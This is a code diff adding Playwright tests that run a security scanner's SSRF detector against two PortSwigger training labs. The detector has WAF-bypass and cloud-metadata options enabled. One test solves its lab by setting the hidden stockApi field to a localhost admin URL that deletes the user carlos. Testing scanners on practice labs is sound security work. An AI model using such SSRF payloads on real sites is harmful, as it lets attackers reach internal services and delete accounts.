@@ -61,6 +61,9 @@ const LAB_URLS: Record<string, string> = {
   'sqli-union-columns': '/web-security/sql-injection/union-attacks/lab-determine-number-of-columns',
   'xss-reflected-html': '/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded',
   'xss-stored-html': '/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded',
+  // SSRF Labs
+  'ssrf-basic-localhost': '/web-security/ssrf/lab-basic-ssrf-against-localhost',
+  'ssrf-blacklist-bypass': '/web-security/ssrf/lab-ssrf-with-blacklist-filter',
 };
 
 // Test timeout (labs take time to start)
@@ -542,5 +545,210 @@ test.describe('PortSwigger Labs - Kinetic Framework', () => {
     });
 
   }); // End XSS Labs
+
+  // ==========================================================================
+  // SSRF LABS - Using ElementScanner with Advanced SsrfDetector
+  // ==========================================================================
+
+  test.describe('SSRF Labs', () => {
+
+    test('Basic SSRF against localhost (ElementScanner + SsrfDetector)', async ({ page, context }) => {
+      // Step 1: Login to PortSwigger
+      await loginToPortSwigger(page);
+      
+      // Step 2: Start the lab
+      const labUrl = await startLab(page, LAB_URLS['ssrf-basic-localhost']);
+      
+      logLabHeader(
+        'Basic SSRF against the local server',
+        'SSRF',
+        'APPRENTICE',
+        labUrl
+      );
+      
+      // Step 3: Navigate to a product page with Check Stock functionality
+      // The vulnerability is in the stockApi parameter
+      await page.goto(`${labUrl}/product?productId=1`);
+      await page.waitForLoadState('networkidle');
+      
+      // Step 4: Use ElementScanner with SsrfDetector
+      console.log('\n🔍 Running Kinetic Framework ElementScanner...');
+      console.log('   Using: ElementScanner + Advanced SsrfDetector');
+      console.log('   Target: stockApi hidden input (Check Stock form)');
+      
+      // Import SsrfDetector
+      const { SsrfDetector } = await import('../src/detectors/active/SsrfDetector');
+      
+      // The stockApi is typically a hidden input in the Check Stock form
+      const scanner = new ElementScanner({
+        baseUrl: labUrl,
+        pageUrl: '/product?productId=1',
+        elements: [{
+          locator: 'input[name="stockApi"], form[action*="stock"] input[type="hidden"]',
+          name: 'stockApi',
+          type: AttackSurfaceType.FORM_INPUT,
+          context: InjectionContext.URL,
+          testCategories: ['ssrf'],
+          metadata: { 
+            formMethod: 'post',
+          }
+        }],
+        pageTimeout: 90000,
+        continueOnError: true,
+      });
+
+      // Register SsrfDetector with all detection strategies
+      scanner.registerDetectors([
+        new SsrfDetector({
+          enableReflected: true,
+          enableTiming: false, // Disable timing for faster test
+          enableOOB: false,
+          enableWafBypass: true,
+          enableCloudMetadata: true,
+          enableProtocolSmuggling: true,
+          adminPaths: ['/admin', '/admin/', '/administrator'],
+        })
+      ]);
+
+      // Create scan context
+      const vulnerabilities: Vulnerability[] = [];
+      const scanContext = {
+        page,
+        browserContext: context,
+        config: {} as any,
+        logger: new Logger(LogLevel.INFO, 'PortSwigger-SSRF'),
+        emitVulnerability: (v: Vulnerability) => {
+          vulnerabilities.push(v);
+          console.log(`  🚨 [${v.severity}] ${v.title}`);
+        },
+      } as any;
+
+      await scanner.initialize(scanContext);
+      const result = await scanner.execute();
+      const allVulns = [...result.vulnerabilities, ...vulnerabilities];
+      
+      // Step 5: Report findings
+      console.log(`\n📊 Kinetic Framework Results: ${allVulns.length} vulnerabilities found`);
+      logVulnerabilities(allVulns);
+      recordVulnerabilities(allVulns, test.info(), { scanner: 'ElementScanner', detector: 'SsrfDetector' });
+      
+      // Step 6: If SSRF found, try to solve the lab by deleting user carlos
+      if (allVulns.length > 0) {
+        console.log('\n🎯 Attempting to solve lab by accessing admin panel...');
+        
+        // Try to access admin panel via SSRF
+        const checkStockForm = page.locator('form[action*="stock"]');
+        if (await checkStockForm.isVisible()) {
+          // Get the stockApi input and set it to localhost admin
+          await page.evaluate(() => {
+            const input = document.querySelector('input[name="stockApi"]') as HTMLInputElement;
+            if (input) {
+              input.value = 'http://localhost/admin/delete?username=carlos';
+            }
+          });
+          
+          // Submit the form
+          await page.click('button:has-text("Check stock")').catch(() => {});
+          await page.waitForTimeout(2000);
+        }
+      }
+      
+      // Step 7: Check if solved
+      await page.goto(labUrl);
+      await page.waitForLoadState('networkidle');
+      const solved = await checkLabSolved(page);
+      console.log(`\n${solved ? '✅ LAB SOLVED!' : '⚠️ SSRF vulnerabilities detected'}`);
+      
+      // Test passes if we found vulnerabilities OR the lab was solved
+      const success = allVulns.length > 0 || solved;
+      expect(success).toBe(true);
+    });
+
+    test('SSRF with blacklist-based filter bypass (ElementScanner + SsrfDetector)', async ({ page, context }) => {
+      // Step 1: Login to PortSwigger
+      await loginToPortSwigger(page);
+      
+      // Step 2: Start the lab
+      const labUrl = await startLab(page, LAB_URLS['ssrf-blacklist-bypass']);
+      
+      logLabHeader(
+        'SSRF with blacklist-based input filter',
+        'SSRF',
+        'PRACTITIONER',
+        labUrl
+      );
+      
+      // Step 3: Navigate to a product page
+      await page.goto(`${labUrl}/product?productId=1`);
+      await page.waitForLoadState('networkidle');
+      
+      // Step 4: Use ElementScanner with SsrfDetector (WAF bypass enabled)
+      console.log('\n🔍 Running Kinetic Framework ElementScanner...');
+      console.log('   Using: ElementScanner + Advanced SsrfDetector');
+      console.log('   Target: stockApi with WAF bypass payloads');
+      console.log('   Features: IPv6, Hex, Octal, Decimal, DNS rebinding');
+      
+      const { SsrfDetector } = await import('../src/detectors/active/SsrfDetector');
+      
+      const scanner = new ElementScanner({
+        baseUrl: labUrl,
+        pageUrl: '/product?productId=1',
+        elements: [{
+          locator: 'input[name="stockApi"], form[action*="stock"] input[type="hidden"]',
+          name: 'stockApi',
+          type: AttackSurfaceType.FORM_INPUT,
+          context: InjectionContext.URL,
+          testCategories: ['ssrf'],
+          metadata: { formMethod: 'post' }
+        }],
+        pageTimeout: 120000, // Longer timeout for WAF bypass testing
+        continueOnError: true,
+      });
+
+      // Register SsrfDetector with WAF bypass enabled
+      scanner.registerDetectors([
+        new SsrfDetector({
+          enableReflected: true,
+          enableTiming: false,
+          enableOOB: false,
+          enableWafBypass: true,  // Enable all WAF bypass payloads
+          enableCloudMetadata: false,
+          enableProtocolSmuggling: false,
+          adminPaths: ['/admin', '/Admin', '/ADMIN'],
+        })
+      ]);
+
+      const vulnerabilities: Vulnerability[] = [];
+      const scanContext = {
+        page,
+        browserContext: context,
+        config: {} as any,
+        logger: new Logger(LogLevel.INFO, 'PortSwigger-SSRF-Bypass'),
+        emitVulnerability: (v: Vulnerability) => {
+          vulnerabilities.push(v);
+          console.log(`  🚨 [${v.severity}] ${v.title}`);
+          console.log(`     Payload: ${v.evidence?.payload || 'N/A'}`);
+        },
+      } as any;
+
+      await scanner.initialize(scanContext);
+      const result = await scanner.execute();
+      const allVulns = [...result.vulnerabilities, ...vulnerabilities];
+      
+      // Step 5: Report findings
+      console.log(`\n📊 Kinetic Framework Results: ${allVulns.length} vulnerabilities found`);
+      logVulnerabilities(allVulns);
+      recordVulnerabilities(allVulns, test.info(), { scanner: 'ElementScanner', detector: 'SsrfDetector (WAF Bypass)' });
+      
+      // Step 6: Check if solved
+      await page.goto(labUrl);
+      const solved = await checkLabSolved(page);
+      console.log(`\n${solved ? '✅ LAB SOLVED!' : '⚠️ SSRF vulnerabilities detected'}`);
+      
+      const success = allVulns.length > 0 || solved;
+      expect(success).toBe(true);
+    });
+
+  }); // End SSRF Labs
 
 }); // End main describe
